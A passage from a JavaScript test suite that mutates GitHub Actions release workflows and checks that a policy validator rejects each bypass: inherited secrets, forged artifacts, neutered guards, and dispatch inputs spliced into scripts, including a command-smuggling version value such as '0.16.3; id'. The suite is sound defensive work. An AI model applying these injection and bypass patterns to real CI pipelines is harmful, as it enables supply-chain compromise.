        .replace('HOME="$isolated_home" node', "node");
    }],
    ["published macOS Python pin drifts", workflow => {
      draftStep(workflow.jobs.smoke, "Install pinned Python on macOS").run
        = draftStep(workflow.jobs.smoke, "Install pinned Python on macOS").run
          .replaceAll("3.13.14", "3.14.6");
    }],
    ["Windows installer loses the protected execution policy", workflow => {
      draftStep(workflow.jobs.smoke, "Run Windows installer ownership self-test").shell
        = "pwsh";
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), /post-publish-release-smoke\.yml/u);
    });
  }
});

test("package workflow keeps a packaging-only timeout", () => {
  const workflows = loadWorkflows();
  assert.deepEqual(validateWorkflows(workflows), []);

  workflows.get("packaged-platform-proof.yml").jobs.build["timeout-minutes"] =
    "${{ inputs.calibration_mode && 180 || (inputs.candidate_installed_proof && 120 || 60) }}";

  assert.match(
    validateWorkflows(workflows).join("\n"),
    /package build timeout must cover only signed macOS packaging/u,
  );
});

test("draft source workflow freezes its complete top-level contract", async (t) => {
  assert.deepEqual(draftWorkflowPolicyViolations(draftSourceWorkflow()), []);
  const reordered = draftSourceWorkflow();
  [reordered.on.pull_request.paths[0], reordered.on.pull_request.paths[1]]
    = [reordered.on.pull_request.paths[1], reordered.on.pull_request.paths[0]];
  assert.deepEqual(
    draftWorkflowPolicyViolations(reordered),
    [],
    "path membership is exact but order-insensitive",
  );

  const mutations = [
    ["workflow name", workflow => { workflow.name = "Draft checks"; }],
    ["missing pull request trigger", workflow => { delete workflow.on.pull_request; }],
    ["extra push trigger", workflow => { workflow.on.push = { branches: ["main"] }; }],
    ["missing path", workflow => { workflow.on.pull_request.paths.pop(); }],
    ["duplicate path", workflow => {
      workflow.on.pull_request.paths[1] = workflow.on.pull_request.paths[0];
    }],
    ["extra path", workflow => { workflow.on.pull_request.paths.push("scripts/**"); }],
    ["dispatch inputs", workflow => {
      workflow.on.workflow_dispatch = { inputs: { ref: { required: false, type: "string" } } };
    }],
    ["missing dispatch", workflow => { delete workflow.on.workflow_dispatch; }],
    ["write permission", workflow => { workflow.permissions.contents = "write"; }],
    ["extra permission", workflow => { workflow.permissions.actions = "read"; }],
    ["concurrency group", workflow => { workflow.concurrency.group = "draft-${{ github.ref }}"; }],
    ["disabled concurrency cancellation", workflow => {
      workflow.concurrency["cancel-in-progress"] = false;
    }],
    ["extra concurrency field", workflow => { workflow.concurrency.limit = 1; }],
    ["top-level env", workflow => { workflow.env = { CARGO_TERM_COLOR: "always" }; }],
    ["top-level defaults", workflow => {
      workflow.defaults = { run: { shell: "bash" } };
    }],
    ["missing jobs", workflow => { delete workflow.jobs; }],
    ["cloned job", workflow => {
      workflow.jobs["extra-draft-lane"] = structuredClone(workflow.jobs["linux-draft"]);
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceWorkflow();
      mutate(candidate);
      assert.notDeepEqual(draftWorkflowPolicyViolations(candidate), []);
    });
  }
});

test("draft source job rejects every alternate execution surface", async (t) => {
  assert.deepEqual(draftSourcePolicyViolations(draftSourceJob(), retrievalSourceJob()), []);

  const mutations = [
    ["job name", job => { job.name = "Draft source"; }],
    ["runner", job => { job["runs-on"] = "ubuntu-24.04"; }],
    ["timeout", job => { job["timeout-minutes"] = 60; }],
    ["if", job => { job.if = "always()"; }],
    ["needs", job => { job.needs = ["untrusted"]; }],
    ["permissions", job => { job.permissions = { contents: "write" }; }],
    ["continue-on-error", job => { job["continue-on-error"] = true; }],
    ["strategy", job => { job.strategy = { matrix: { shard: [1, 2] } }; }],
    ["env", job => { job.env = { RUSTFLAGS: "-Awarnings" }; }],
    ["defaults", job => { job.defaults = { run: { shell: "bash" } }; }],
    ["environment", job => { job.environment = "release"; }],
    ["container", job => { job.container = "ubuntu:latest"; }],
    ["services", job => { job.services = { cache: { image: "redis" } }; }],
    ["outputs", job => { job.outputs = { result: "${{ steps.proof.outputs.result }}" }; }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }
});

test("draft source steps reject checkout and proof bypass mutations", async (t) => {
  const checkout = job => job.steps[0];
  const proof = job => draftStep(job, "Prove focused publication contracts");
  const mutations = [
    ["checkout ref", job => { checkout(job).with = { ref: "refs/heads/main" }; }],
    ["checkout persisted credentials", job => {
      checkout(job).with = { "persist-credentials": true };
    }],
    ["checkout if", job => { checkout(job).if = "always()"; }],
    ["checkout continue-on-error", job => { checkout(job)["continue-on-error"] = true; }],
    ["checkout env", job => { checkout(job).env = { GH_TOKEN: "token" }; }],
    ["checkout id", job => { checkout(job).id = "checkout"; }],
    ["checkout action", job => { checkout(job).uses = "actions/checkout@v4"; }],
    ["cloned step", job => { job.steps.push(structuredClone(checkout(job))); }],
    ["deleted step", job => { job.steps.splice(5, 1); }],
    ["reordered steps", job => {
      [job.steps[5], job.steps[6]] = [job.steps[6], job.steps[5]];
    }],
    ["run step shell", job => { draftStep(job, "Check formatting").shell = "bash"; }],
    ["restore extra input", job => {
      draftStep(job, "Restore Cargo inputs and output").with["fail-on-cache-miss"] = false;
    }],
    ["save extra input", job => {
      draftStep(job, "Save Cargo inputs and output").with["restore-keys"] = "decoy";
    }],
    ["proof if", job => { proof(job).if = "always()"; }],
    ["proof continue-on-error", job => { proof(job)["continue-on-error"] = true; }],
    ["proof env", job => { proof(job).env = { RUST_BACKTRACE: "1" }; }],
    ["native staging proof removed", job => {
      proof(job).run = proof(job).run
        .split("\n")
        .filter(command => !command.includes("--test native_staging"))
        .join("\n");
    }],
    ["native staging proof reordered", job => {
      const commands = proof(job).run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      proof(job).run = commands.join("\n");
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }
});

test("draft source workflow rejects cloned top-level jobs", () => {
  const workflows = loadWorkflows();
  const workflow = draftSourceWorkflow();
  assert.deepEqual(draftWorkflowPolicyViolations(workflow), []);

  workflow.jobs["extra-draft-lane"] = structuredClone(workflow.jobs["linux-draft"]);
  workflows.set("rust-ci.yml", workflow);
  assert.match(
    validateWorkflows(workflows).join("\n"),
    /must contain exactly the linux-draft job/u,
  );
});

test("PR package proof cannot opt into signing credentials", () => {
  const workflow = { jobs: { "packaged-proof": { with: { sign_macos: false } } } };
  assert.deepEqual(packagedPrSigningViolations(workflow), []);

  for (const mutate of [
    candidate => { candidate.jobs["packaged-proof"].with.sign_macos = true; },
    candidate => { candidate.jobs["packaged-proof"].secrets = "inherit"; },
    candidate => { candidate.jobs["packaged-proof"].environment = "macos-release-signing"; },
    candidate => { candidate.env = { APPLE_NOTARY_KEY_ID: "forbidden" }; },
  ]) {
    const candidate = structuredClone(workflow);
    mutate(candidate);
    assert.notDeepEqual(packagedPrSigningViolations(candidate), []);
  }
});

test("release approval crosses only the protected release boundary", () => {
  const boundary = releaseEvidenceApprovalBoundary();
  assert.deepEqual(releaseEvidenceApprovalViolations(boundary.callers, boundary.called), []);

  for (const mutate of [
    candidate => { candidate.callers[0][1] = undefined; },
    candidate => { candidate.callers[1][1].uses = "./.github/workflows/release.yml"; },
    candidate => { delete candidate.callers[1][1].with.source_run_id; },
    candidate => { delete candidate.callers[0][1].secrets; },
    candidate => {
      candidate.callers[0][1].secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON
        = "${{ secrets.WRONG_SECRET }}";
    },
    candidate => { candidate.callers[0][1].secrets.EXTRA_SECRET = "${{ secrets.EXTRA }}"; },
    candidate => { candidate.callers[0][1].secrets = "inherit"; },
    candidate => { candidate.callers[1][1].secrets = "inherit"; },
    candidate => { delete candidate.called.on.workflow_call.secrets; },
    candidate => {
      candidate.called.on.workflow_call.secrets
        .CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON.required = true;
    },
    candidate => { candidate.called.jobs.measure.environment = "release"; },
    candidate => {
      candidate.called.jobs.measure.steps[0].env.APPROVAL_JSON
        = "${{ inputs.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}";
    },
    candidate => { candidate.called.jobs.measure.steps[0].run = "exit 1"; },
  ]) {
    const candidate = structuredClone(boundary);
    mutate(candidate);
    assert.notDeepEqual(releaseEvidenceApprovalViolations(candidate.callers, candidate.called), []);
  }
});

test("notarization must use explicit polling", () => {
  assert.deepEqual(notaryStepViolations({ run: "xcrun notarytool submit bundle.zip \\\n  --no-wait" }), []);
  assert.match(
    notaryStepViolations({ run: "xcrun notarytool submit bundle.zip \\\n  --wait" }).join("\n"),
    /poll explicitly/u,
  );
});

test("bare macOS CLI proof uses quarantine execution instead of app assessment", () => {
  const assessment = {
    run: [
      "xattr -w com.apple.quarantine quarantine codestory-cli",
      "xattr -p com.apple.quarantine codestory-cli > quarantine.txt",
      "spctl --assess --type execute --verbose=4 codestory-cli > spctl-diagnostic.txt 2>&1",
      "spctl_status=$?",
      "grep -F 'does not seem to be an app' spctl-diagnostic.txt",
    ].join("\n"),
  };
  const execution = { run: "codestory-cli --version\ncodestory-cli --help" };
  assert.deepEqual(macosCliDistributionViolations(assessment, execution, "codestory-cli"), []);

  for (const mutate of [
    candidate => { candidate.assessment.run = candidate.assessment.run.replace("xattr -w com.apple.quarantine quarantine codestory-cli", "true"); },
    candidate => { candidate.assessment.run += "\naccepted=false"; },
    candidate => { candidate.assessment.run = candidate.assessment.run.replace("spctl_status=$?", "true"); },
    candidate => { candidate.execution.run = "original-cli --version\noriginal-cli --help"; },
  ]) {
    const candidate = { assessment: structuredClone(assessment), execution: structuredClone(execution) };
    mutate(candidate);
    assert.notDeepEqual(macosCliDistributionViolations(candidate.assessment, candidate.execution, "codestory-cli"), []);
  }
});

test("controlled semantic workflow fixtures emit class-prefixed diagnostics", async (t) => {
  const fixture = JSON.parse(readFileSync(path.join(
    root,
    ".github/scripts/fixtures/workflow-policy-invalid.json",
  ), "utf8"));
  assert.deepEqual(releaseWorkflowContractViolations(loadWorkflows()), []);
  for (const fixtureCase of fixture.cases) {
    await t.test(fixtureCase.id, () => {
      const workflows = loadWorkflows();
      const workflow = workflows.get(fixtureCase.workflow);
      let target = fixtureCase.job ? workflow.jobs[fixtureCase.job] : workflow;
      if (fixtureCase.step) {
        target = target.steps.find(({ name }) => name === fixtureCase.step);
        assert.ok(target, `missing step ${fixtureCase.step}`);
      }
      const field = [...fixtureCase.field];
      const key = field.pop();
      for (const segment of field) target = target[segment];
      if (fixtureCase.op === "delete") delete target[key];
      else target[key] = structuredClone(fixtureCase.value);
      const violations = releaseWorkflowContractViolations(workflows);
      assert.ok(
        violations.some((message) => message.startsWith(fixtureCase.class_prefix)),
        violations.join("\n"),
      );
    });
  }
});

test("release policy rejects manifest producer, trusted-map, and publication bypasses", () => {
  const mutations = [
    ["call expected head", workflows => { delete workflows.get("release.yml").on.workflow_call.inputs.expected_head_sha; }],
    ["call publication default", workflows => { workflows.get("release.yml").on.workflow_call.inputs.publish_release.default = true; }],
    ["manual expected head", workflows => { workflows.get("release.yml").on.workflow_dispatch.inputs.expected_head_sha.required = false; }],
    ["manual publication authority", workflows => {
      workflows.get("release.yml").on.workflow_dispatch.inputs.publish_release = {
        required: false,
        type: "boolean",
        default: false,
      };
    }],
    ["release authority guard", workflows => {
      const step = workflows.get("release.yml").jobs.preflight.steps
        .find(({ name }) => name === "Validate release authority");
      step.run = step.run.replace("dev/codestory-next moved from proved head", "dev head changed");
    }],
    ["automatic caller event", workflows => {
      const step = workflows.get("release.yml").jobs.preflight.steps
        .find(({ name }) => name === "Validate release authority");
      step.run = step.run.replace('"$GITHUB_EVENT_NAME" != "push"', '"$GITHUB_EVENT_NAME" != "workflow_call"');
    }],
    ["accepted dev ledger revalidation", workflows => {
      workflows.get("release.yml").jobs["pre-publish-closeout"].steps = workflows
        .get("release.yml").jobs["pre-publish-closeout"].steps
        .filter(({ name }) => name !== "Revalidate proof-only dev head");
    }],
    ["publish-time main revalidation", workflows => {
      const step = workflows.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Create GitHub release");
      step.run = step.run.replace("main moved from publishable head", "main changed");
    }],
    ["publish authority", workflows => { delete workflows.get("release.yml").jobs.publish.if; }],
    ["post-publish smoke authority", workflows => { delete workflows.get("release.yml").jobs["post-publish-smoke"].if; }],
    ["post-publish closeout authority", workflows => { delete workflows.get("release.yml").jobs["post-publish-closeout"].if; }],
    ["trusted caller opt-in", workflows => { delete workflows.get("auto-release.yml").jobs.release.with.publish_release; }],
    ["trusted caller secret handoff", workflows => { delete workflows.get("auto-release.yml").jobs.release.secrets; }],
    ["duplicate automatic policy gate", workflows => {
      workflows.get("auto-release.yml").jobs["workflow-policy"] = {
        "runs-on": "ubuntu-latest",
        steps: [],
      };
    }],
    ["duplicate automatic version validation", workflows => {
      workflows.get("auto-release.yml").jobs["detect-version"].steps.push({
        name: "Validate synchronized release version",
        run: "python .github/scripts/check-codestory-release.py --version 0.16.0",
      });
    }],
    ["manual release source permissions", workflows => { delete workflows.get("release.yml").permissions["pull-requests"]; }],
    ["automatic release source permissions", workflows => { delete workflows.get("auto-release.yml").jobs.release.permissions["pull-requests"]; }],
    ["rogue release caller", workflows => {
      workflows.get("plugin-static.yml").jobs["rogue-release"] = {
        uses: "./.github/workflows/release.yml",
      };
    }],
    ["source emission", workflows => { delete workflows.get("release.yml").jobs["source-proof"].with.emit_release_cells; }],
    ["full rerun preflight guard", workflows => {
      workflows.get("release.yml").jobs.preflight.steps = workflows
        .get("release.yml").jobs.preflight.steps
        .filter(({ name }) => name !== "Refuse existing tag or release");
    }],
    ["public marketplace preflight", workflows => {
      workflows.get("release.yml").jobs.preflight.steps = workflows
        .get("release.yml").jobs.preflight.steps
        .filter(({ name }) => name !== "Prove the public marketplace install path");
    }],
    ["post-publish marketplace revision handoff", workflows => {
      workflows.get("release.yml").jobs["post-publish-smoke"].with.marketplace_revision = "main";
    }],
    ["publish replay guard", workflows => {
      const step = workflows.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Refuse existing tag or release");
      step.run = step.run.replaceAll("exit 1", "true");
    }],
    ["publish bypass", workflows => {
      workflows.get("release.yml").jobs.publish.needs = [
        "preflight",
        "packaged-proof",
        "macos-metal-proof",
        "windows-vulkan-proof",
      ];
    }],
    ["trusted producer map", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Evaluate authenticated pre-publish closeout");
      step.run = step.run.replace("--trusted-producers", "--self-attested-producers");
    }],
    ["flattened current-run JSON", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Download selected pre-publish release cells");
      delete step.with["artifact-ids"];
      step.with.pattern = "release-cell-prepublish-*";
      step.with["merge-multiple"] = true;
    }],
    ["container digest warning accepted", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Verify selected pre-publish artifact container digests");
      step.run = step.run.replace(
        'test "$actual_digest" = "$expected_digest"',
        'echo "$actual_digest $expected_digest"',
      );
    }],
    ["attempt-free artifact", workflows => {
      const step = workflows.get("source-proof.yml").jobs["full-source-gate"].steps
        .find(({ name }) => name === "Upload authenticated source release cell");
      step.with.name = "release-cell-prepublish-source";
    }],
    ["rerun-unsafe diagnostic artifact", workflows => {
      const step = workflows.get("post-publish-release-smoke.yml").jobs.smoke.steps
        .find(({ name }) => name === "Upload post-publish proof artifacts");
      step.with.name = "post-publish-proof-fixed";
    }],
    ["rerun-unsafe stable artifact", workflows => {
      const step = workflows.get("packaged-platform-proof.yml").jobs.build.steps
        .find(({ name }) => name === "Upload release asset");
      delete step.with.overwrite;
    }],
    ["overwriteable terminal evidence", workflows => {
      const step = workflows.get("linux-vulkan-proof.yml")
        .jobs["optional-constant-calibration"].steps
        .find(({ name }) => name === "Upload optional Linux Vulkan calibration evidence");
      step.with.name = "optional-embedding-calibration-linux-vulkan-${{ inputs.version }}";
      step.with.overwrite = true;
    }],
    ["attempt-qualified duplicate stable key", workflows => {
      const steps = workflows.get("macos-metal-proof.yml").jobs["packaged-metal"].steps;
      const index = steps.findIndex(({ name }) => name === "Upload Metal calibration runs");
      steps.splice(index + 1, 0, {
        name: "Upload Metal calibration runs",
        uses: "actions/upload-artifact@v7.0.1",
        with: {
          name: "diagnostic-attempt-${{ github.run_attempt }}",
          path: "forged.json",
          "retention-days": 30,
        },
      });
    }],
    ["rogue artifact producer", workflows => {
      workflows.get("release.yml").jobs["pre-publish-closeout"].steps.push({
        name: "Upload forged release cell",
        uses: "actions/upload-artifact@v7.0.1",
        with: {
          name: "release-cell-prepublish-source-attempt-${{ github.run_attempt }}",
          path: "forged.json",
        },
      });
    }],
    ["pre-publish ledger", workflows => {
      const step = workflows.get("release.yml").jobs["post-publish-closeout"].steps
        .find(({ name }) => name === "Evaluate authenticated post-publish closeout");
      step.run = step.run.replace("--pre-publish-ledger", "--untrusted-ledger");
    }],
    ["success-only post-publish upload", workflows => {
      delete workflows.get("post-publish-release-smoke.yml").jobs.smoke.steps
        .find(({ name }) => name === "Upload authenticated post-publish release cells").if;
    }],
  ];
  for (const [label, mutate] of mutations) {
    const workflows = loadWorkflows();
    mutate(workflows);
    assert.notDeepEqual(validateWorkflows(workflows), [], label);
  }
});

// The gate `publish` sits behind was asserted by a condition that could never fail. The claim
// graph now owns the whole plugin chain, so this suite proves the graph-driven assertion actually
// refuses each way the gate can be dropped -- and, because `needs:` is an unordered set in GitHub
// Actions, that a reordered-but-equivalent gate is *not* reported.
test("plugin publish must actually wait on preflight and plugin proof", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "plugin-release.yml";
  const expected = /plugin-release\.yml publish dependencies must match the release claim graph/u;
  const mutations = [
    ["publish drops plugin proof", workflow => {
      workflow.jobs.publish.needs = ["preflight"];
    }],
    ["publish waits on nothing", workflow => {
      delete workflow.jobs.publish.needs;
    }],
    ["publish waits on a single scalar", workflow => {
      workflow.jobs.publish.needs = "preflight";
    }],
    ["publish waits on an unrelated job", workflow => {
      workflow.jobs.publish.needs = ["preflight", "post-publish-smoke"];
    }],
    ["a scalar needs spells the gate as one string", workflow => {
      workflow.jobs.publish.needs = "preflight, plugin-proof";
    }],
  ];
  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
  await t.test("a reordered gate names the same set and is not a violation", () => {
    const workflows = loadWorkflows();
    workflows.get(file).jobs.publish.needs = ["plugin-proof", "preflight"];
    assert.deepEqual(validateWorkflows(workflows), []);
  });
});

test("marketplace sync keeps dispatch inputs out of script text", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "marketplace-sync.yml";
  const guard = "Validate the dispatched release coordinates";
  const mutations = [
    ["the untokened check interpolates the commit", workflow => {
      const step = draftStep(workflow.jobs.sync, "Require a published release for this commit");
      step.run = step.run.replace('"$INPUT_COMMIT^{commit}"', '"${{ inputs.commit }}^{commit}"');
    }, /steps\.2 must read dispatch inputs from env/u],
    ["the tokened publish interpolates the version", workflow => {
      const step = draftStep(workflow.jobs.sync, "Point the catalog at the published release");
      step.run = step.run.replace('"$INPUT_VERSION"', '"${{ inputs.version }}"');
    }, /steps\.4 must read dispatch inputs from env/u],
    ["a consumed input loses its env binding", workflow => {
      delete draftStep(workflow.jobs.sync, "Point the catalog at the published release")
        .env.INPUT_COMMIT;
    }, /steps\.4 must bind INPUT_COMMIT/u],
    ["an env binding is rewired to another value", workflow => {
      draftStep(workflow.jobs.sync, guard).env.INPUT_VERSION = "${{ github.ref_name }}";
    }, /steps\.0 must bind INPUT_VERSION/u],
    ["the commit shape check disappears", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replace("^[0-9a-fA-F]{7,40}$", "^.*$");
    }, /must run commit_shape='\^\[0-9a-fA-F\]\{7,40\}\$'/u],
    ["the version shape check disappears", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replace("^[0-9]+\\.[0-9]+\\.[0-9]+", "^.+");
    }, /must run version_shape=/u],
    // A prefix fragment cannot see a dropped closing anchor, and an unanchored version regex admits
    // `0.16.3; id`. The pinned fragment carries the anchor, so the truncation is a violation.
    ["the version regex loses its closing anchor", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replace("(-[0-9A-Za-z.]+)?$'", "'");
    }, /must run version_shape='\^\[0-9\]\+\\\.\[0-9\]\+\\\.\[0-9\]\+\(-\[0-9A-Za-z\.\]\+\)\?\$'/u],
    // Substring assertions prove a string is present, not that it is consulted. This body satisfies
    // every fragment above -- both anchored regexes, both comparisons, no grep -- and refuses
    // nothing, so only a pin over the whole script can see it.
    ["the guard keeps every pinned fragment and stops refusing anything", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replaceAll("exit 1", ":");
    }, /must match the reviewed dispatch coordinate guard script exactly/u],
    ["the commit comparison is rewired away from its regex", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replace("=~ $commit_shape", "=~ .*");
    }, /must run if \[\[ ! "\$INPUT_COMMIT" =~ \$commit_shape \]\]; then/u],
    // grep tests a line, so the whole-value comparison must not be traded back for one.
    ["the value comparison reverts to a line-oriented grep", workflow => {
      const step = draftStep(workflow.jobs.sync, guard);
      step.run = step.run.replace(
        'if [[ ! "$INPUT_VERSION" =~ $version_shape ]]; then',
        'if ! printf \'%s\' "$INPUT_VERSION" | grep -Eq "$version_shape"; then',
      );
    }, /must not run grep/u],
    ["validation moves behind the minted token", workflow => {
      moveNamedStepAfter(workflow.jobs.sync, guard, "Mint a scoped marketplace token");
    }, /must validate the dispatched coordinates before any other step/u],
    // Validating first only matters if the validated value is what the checkout resolves.
    ["the checkout resolves the workflow ref instead of the validated commit", workflow => {
      draftStep(workflow.jobs.sync, "Checkout the published commit").with.ref = "${{ github.ref }}";
    }, /Checkout the published commit must resolve the validated \$\{\{ inputs\.commit \}\}/u],
    ["the checkout resolves an unvalidated spelling of the same input", workflow => {
      draftStep(workflow.jobs.sync, "Checkout the published commit").with.ref =
        "${{ github.event.inputs.commit }}";
    }, /Checkout the published commit must resolve the validated \$\{\{ inputs\.commit \}\}/u],
    ["a third dispatch input appears", workflow => {
      workflow.on.workflow_dispatch.inputs.ref = { required: false, type: "string" };
    }, /must dispatch on exactly a version and a commit/u],
    // Pinning `on.workflow_dispatch.inputs` says nothing about a second trigger, and a
    // `workflow_call` input is neither validated by the guard nor named by that assertion.
    ["a second trigger opens an unvalidated input surface", workflow => {
      workflow.on.workflow_call = { inputs: { ref: { required: false, type: "string" } } };
    }, /must be reachable only by manual dispatch/u],
    ["the file becomes reachable on push", workflow => {
      workflow.on.push = { branches: ["main"] };
    }, /must be reachable only by manual dispatch/u],
    // The ban advertises itself as a property of the file. A scan scoped to `jobs.sync` would
    // exempt any job added beside it -- fully formed, so nothing else in policy objects either.
    ["a second job interpolates the commit into its own script", workflow => {
      workflow.jobs.leak = {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": 10,
        permissions: { contents: "read" },
        steps: [{
          name: "Echo the dispatched commit",
          shell: "bash",
          run: 'echo "${{ inputs.commit }}"\n',
        }],
      };
    }, /jobs\.leak\.steps\.0 must read dispatch inputs from env/u],
    ["a second job's step runs under an unpinned shell", workflow => {
      workflow.jobs.leak = {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": 10,
        permissions: { contents: "read" },
        steps: [{ name: "Do something", run: "echo hello\n" }],
      };
    }, /jobs\.leak\.steps\.0 must declare shell: bash/u],
    // `continue-on-error` sits outside the script, exactly like `shell:`, so the guard's own text
    // cannot assert against it. It leaves the refusal running and simply ignores its exit code.
    ["the guard's refusal is downgraded to advice", workflow => {
      workflow.jobs.sync.steps[0]["continue-on-error"] = true;
    }, /jobs\.sync\.steps\.0 must not declare continue-on-error/u],
    ["a whole job downgrades every guard it contains", workflow => {
      workflow.jobs.sync["continue-on-error"] = true;
    }, /jobs\.sync must not declare continue-on-error/u],
    // A `uses:` step is not exempt: an action can evaluate the input it is handed, and
    // `actions/github-script` runs its `script:` input as JavaScript.
    ["a pinned action evaluates the commit as script text", workflow => {
      workflow.jobs.sync.steps.push({
        name: "Report the dispatched commit",
        uses: `actions/github-script@${fullSha}`,
        with: { script: 'console.log("${{ inputs.commit }}")' },
      });
    }, /jobs\.sync\.steps\.5 must not splice a dispatch input into an action input/u],
    ["a pinned action takes the unvalidated spelling of the input", workflow => {
      workflow.jobs.sync.steps.push({
        name: "Report the dispatched commit",
        uses: `actions/github-script@${fullSha}`,
        with: { script: 'console.log("${{ github.event.inputs.commit }}")' },
      });
    }, /jobs\.sync\.steps\.5 must not splice a dispatch input into an action input/u],
    // `$NAME` and `${NAME}` are the same read, so a binding assertion that only sees the bare form
    // is evaded by writing the brace form and deleting the bindings.
    ["a brace-form read loses both of its env bindings", workflow => {
      const step = draftStep(workflow.jobs.sync, "Point the catalog at the published release");
      step.run = step.run
        .replaceAll('"$INPUT_COMMIT"', '"${INPUT_COMMIT}"')
        .replaceAll('"$INPUT_VERSION"', '"${INPUT_VERSION}"');
      delete step.env.INPUT_COMMIT;
      delete step.env.INPUT_VERSION;
    }, /jobs\.sync\.steps\.4 must bind INPUT_COMMIT/u],
    // The other direction: a binding may not name the unvalidated spelling, whether or not the
    // step that declares it is the step that reads it.
    ["a binding is rewired to the unvalidated spelling but never read", workflow => {
      workflow.jobs.sync.steps.push({
        name: "Carry an unvalidated commit",
        shell: "bash",
        env: { INPUT_COMMIT: "${{ github.event.inputs.commit }}" },
        run: "echo bound\n",
      });
    }, /jobs\.sync\.steps\.5 must bind INPUT_COMMIT/u],
    // Job-level `env:` is below every step's own binding check, so the unvalidated spelling is
    // refused by name wherever it appears rather than only where a step declares it.
    ["the unvalidated spelling hides in job-level env", workflow => {
      workflow.jobs.sync.env = { CARRIED: "${{ github.event.inputs.commit }}" };
    }, /must name a dispatch input only as \$\{\{ inputs\.commit \}\}/u],
    ["the unvalidated spelling hides in a job-level conditional", workflow => {
      workflow.jobs.sync.if = "${{ github.event.inputs.version != '' }}";
    }, /must name a dispatch input only as \$\{\{ inputs\.commit \}\}/u],
    // The checkout `ref` exemption exists because that one step's ref is separately pinned to the
    // value the guard validated. A like-named step in another job borrows the name, not the guard.
    ["another job borrows the checkout step's name to inherit its exemption", workflow => {
      workflow.jobs.leak = {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": 10,
        permissions: { contents: "read" },
        steps: [{
          name: "Checkout the published commit",
          uses: "actions/checkout@v5",
          with: { ref: "${{ inputs.commit }}" },
        }],
      };
    }, /jobs\.leak\.steps\.0 must not splice a dispatch input into an action input/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
});

function firstRunStep(workflow) {
  for (const [jobId, job] of Object.entries(workflow.jobs ?? {})) {
    const steps = Array.isArray(job?.steps) ? job.steps : [];
    for (const [index, step] of steps.entries()) {
      if (typeof step?.run === "string") return { jobId, index, step };
    }
  }
  return undefined;
}

const unwrittenWorkflow = "future-dispatch-proof.yml";

function unwrittenDispatchWorkflow(run, job = {}) {
  return {
    name: "Future dispatch proof",
    on: { workflow_dispatch: { inputs: { ref: { required: true, type: "string" } } } },
    permissions: { contents: "read" },
    jobs: {
      leak: {
        "runs-on": "ubuntu-latest",
        "timeout-minutes": 10,
        ...job,
        steps: [
          ...(job.steps ?? []),
          { name: "Echo the dispatched ref", shell: "bash", ...run },
        ],
      },
    },
  };
}

// #1554 fixed marketplace-sync.yml and pinned the fix with `validateMarketplaceSync`, a validator
// that names one file. That shape cannot fail on a second file however many times the same splice
// is written, and eight more workflows carried it (#1566). The replacement has to hold a property
// the per-file validator could not: it reads whatever workflows exist, so it covers files nobody
// listed -- including files that do not exist yet. Every test below is a claim about the rule's
// reach, not about any one workflow.
test("no workflow interpolates a dispatch input into a run: body", async (t) => {
  await t.test("the repository as it stands has no such splice anywhere", () => {
    assert.deepEqual(dispatchInputInterpolationViolations(loadWorkflows()), []);
    assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  });

  // The other direction, on every workflow at once. The loop names no file: it grows with the
  // directory, so a workflow added tomorrow is mutated by this suite the day it lands.
  for (const [file, workflow] of loadWorkflows()) {
    const located = firstRunStep(workflow);
    if (located === undefined) continue;
    await t.test(`${file} cannot splice a dispatch input into ${located.step.name ?? "its first script"}`, () => {
      const workflows = loadWorkflows();
      const target = firstRunStep(workflows.get(file));
      target.step.run = `${target.step.run}\necho "\${{ inputs.version }}"\n`;
      const reported = dispatchInputInterpolationViolations(workflows);
      assert.equal(reported.length, 1);
      assert.equal(
        reported[0].startsWith(`${file} jobs.${target.jobId}.steps.${target.index}`),
        true,
        reported[0],
      );
      assert.match(
        validateWorkflows(workflows).join("\n"),
        /must read \$\{\{ inputs\.version \}\} from step env, not interpolated script text/u,
      );
      assert.match(reported[0], /it carries a dispatch input$/u);
    });
  }

  // The claim the per-file validator could not make. Nothing here edits the rule, and the file is
  // not on disk: the rule sees it because it iterates the set it is handed.
  await t.test("a workflow that does not exist yet is covered without editing the rule", () => {
    const workflows = loadWorkflows();
